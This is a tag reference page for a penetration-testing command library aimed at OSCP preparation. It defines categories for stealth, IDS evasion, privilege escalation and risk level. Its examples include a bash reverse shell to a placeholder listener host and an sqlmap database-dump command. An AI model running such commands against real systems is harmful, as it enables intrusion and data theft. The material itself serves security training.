# Tag Reference Guide

Tags categorize commands by their characteristics, helping you find the right tool for your situation.

## Detection & Stealth

| Tag | Meaning | When to Use | When to Avoid |
|-----|---------|-------------|---------------|
| `[NOISY]` | Generates significant traffic/logs | Initial lab testing, time-constrained scenarios | Production networks, stealth assessments |
| `[STEALTH]` | Low detection footprint | Red team ops, production testing | When speed is priority |
| `[IDS_SAFE]` | Unlikely to trigger IDS/IPS | Evading detection systems | Initial reconnaissance |
| `[AGGRESSIVE]` | Fast but detectable | Lab environments, CTFs | Corporate networks |

## Platform Specific

| Tag | Meaning | Example Commands |
|-----|---------|------------------|
| `[LINUX]` | Linux-specific command | `find / -perm -4000 2>/dev/null` |
| `[WINDOWS]` | Windows-specific command | `net user /domain` |
| `[UNIX]` | Unix/BSD variants | `doas`, `pfctl` commands |
| `[MACOS]` | macOS specific | `osascript`, `launchctl` |
| `[CROSS_PLATFORM]` | Works on multiple OS | Python scripts, Java exploits |

## Requirement Tags

| Tag | Meaning | Prerequisites |
|-----|---------|--------------|
| `[REQUIRES_AUTH]` | Needs valid credentials | Username/password, API key, token |
| `[REQUIRES_ROOT]` | Needs root/admin privileges | sudo access, Administrator |
| `[REQUIRES_SHELL]` | Needs existing shell access | Initial foothold obtained |
| `[REQUIRES_GUI]` | Needs graphical interface | X11 forwarding, RDP |
| `[REQUIRES_INTERNET]` | Needs internet connectivity | Downloading tools, C2 callbacks |

## OSCP Relevance

| Tag | Priority | Focus Level |
|-----|----------|-------------|
| `[OSCP:HIGH]` | Essential for exam | Master these commands |
| `[OSCP:MEDIUM]` | Commonly useful | Good to know |
| `[OSCP:LOW]` | Rarely needed | Optional learning |
| `[OSCP:BANNED]` | Prohibited in exam | Learn but don't use in exam |

## Success Likelihood

| Tag | Meaning | Use Case |
|-----|---------|----------|
| `[QUICK_WIN]` | Often successful, fast results | Initial enumeration, common vulns |
| `[RELIABLE]` | Consistent results | Production use, automation |
| `[EXPERIMENTAL]` | May not work reliably | Research, edge cases |
| `[LEGACY]` | For older systems | Windows XP, old Linux kernels |
| `[MODERN]` | For newer systems | Windows 10+, modern Linux |

## Tool Categories

| Tag | Tool Type | Examples |
|-----|-----------|----------|
| `[ENUM]` | Enumeration tool | nmap, gobuster, enum4linux |
| `[EXPLOIT]` | Exploitation tool | metasploit, custom exploits |
| `[PRIVESC]` | Privilege escalation | LinPEAS, WinPEAS |
| `[PERSISTENCE]` | Maintaining access | cron jobs, scheduled tasks |
| `[TRANSFER]` | File transfer methods | wget, curl, powershell |
| `[PIVOT]` | Lateral movement | SSH tunneling, proxychains |

## Technique Tags

| Tag | Technique | Description |
|-----|-----------|-------------|
| `[SQLI]` | SQL Injection | Database attack vectors |
| `[XSS]` | Cross-Site Scripting | Client-side attacks |
| `[LFI]` | Local File Inclusion | File system access |
| `[RFI]` | Remote File Inclusion | Remote code execution |
| `[RCE]` | Remote Code Execution | Direct command execution |
| `[OVERFLOW]` | Buffer Overflow | Memory corruption |
| `[BRUTEFORCE]` | Password attacks | Dictionary/brute force |
| `[SOCIAL]` | Social engineering | Human factor attacks |

## Service Specific

| Tag | Service | Port(s) |
|-----|---------|---------|
| `[SSH]` | Secure Shell | 22 |
| `[HTTP]` | Web Server | 80, 8080 |
| `[HTTPS]` | Secure Web | 443, 8443 |
| `[SMB]` | Windows Shares | 445, 139 |
| `[FTP]` | File Transfer | 21 |
| `[MYSQL]` | MySQL Database | 3306 |
| `[MSSQL]` | MS SQL Server | 1433 |
| `[ORACLE]` | Oracle Database | 1521 |
| `[LDAP]` | Directory Service | 389, 636 |
| `[RDP]` | Remote Desktop | 3389 |

## Timing & Resources

| Tag | Meaning | Consideration |
|-----|---------|---------------|
| `[FAST]` | Executes quickly (<1 min) | Good for quick checks |
| `[SLOW]` | Takes time (>10 min) | Plan accordingly |
| `[RESOURCE_HEAVY]` | High CPU/memory usage | May impact target |
| `[BANDWIDTH]` | High network usage | Consider connection speed |

## Risk Level

| Tag | Risk | Implications |
|-----|------|--------------|
| `[SAFE]` | Minimal risk to target | Read-only operations |
| `[RISKY]` | Could crash service | Test in lab first |
| `[DESTRUCTIVE]` | Modifies/deletes data | Get permission first |
| `[DOS]` | Denial of Service | Never in production |

## Special Purpose

| Tag | Purpose | Usage |
|-----|---------|-------|
| `[MANUAL]` | Manual technique | When tools fail |
| `[AUTOMATED]` | Can be scripted | Good for automation |
| `[INTERACTIVE]` | Requires user input | Can't fully automate |
| `[PASSIVE]` | No active probing | Information gathering |
| `[ACTIVE]` | Direct interaction | Leaves traces |
| `[POST_EXPLOIT]` | After initial access | Second stage attacks |

## Defensive Tags

| Tag | Purpose | Example |
|-----|---------|---------|
| `[DEFENSE]` | Defensive technique | Log analysis, monitoring |
| `[DETECTION]` | Identifies attacks | IDS rules, alerts |
| `[FORENSICS]` | Investigation | Memory analysis, artifacts |
| `[HARDENING]` | Security improvement | Configuration changes |

## Custom Tags

You can create custom tags for your specific needs:

| Custom Tag | Your Meaning |
|-----------|--------------|
| `[CLIENT_X]` | Specific to client X |
| `[PROJECT_Y]` | Project Y specific |
| `[PERSONAL]` | Your personal commands |
| `[TEAM]` | Team-shared commands |
| `[TODO]` | Needs testing/completion |

## Tag Combinations

Commands often have multiple tags:

```bash
# Example: nmap service scan
# Tags: [NOISY] [ENUM] [OSCP:HIGH] [RELIABLE]
nmap -sV -sC <TARGET>

# Example: SQLMap exploitation
# Tags: [SQLI] [NOISY] [REQUIRES_AUTH] [AUTOMATED]
sqlmap -u <URL> --batch --dump

# Example: Reverse shell
# Tags: [LINUX] [RCE] [QUICK_WIN] [POST_EXPLOIT]
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

## Search by Tags

Use tags to filter commands:

```bash
# Find all stealthy commands
crack ref --tag STEALTH

# Find Windows privilege escalation
crack ref --tag WINDOWS --tag PRIVESC

# Find OSCP-critical enumeration
crack ref --tag "OSCP:HIGH" --tag ENUM

# Exclude noisy commands
crack ref --exclude-tag NOISY
```

## Tag Priority

When choosing between commands with different tags:

1. **Safety First**: Prefer `[SAFE]` over `[RISKY]`
2. **Stealth When Needed**: Use `[STEALTH]` in production
3. **Speed in Labs**: Use `[NOISY]` `[FAST]` in CTFs
4. **Platform Match**: Use OS-specific tags appropriately
5. **OSCP Focus**: Prioritize `[OSCP:HIGH]` for exam prep

## Best Practices

1. **Tag Accurately**: Don't mark as `[STEALTH]` if it's not
2. **Multiple Tags**: Use all relevant tags
3. **Update Tags**: Modify as tools/techniques evolve
4. **Document Custom**: Explain any custom tags you create
5. **Contextual Use**: Consider environment when filtering by tags

---

*Part of the [CRACK Reference System](./index.md)*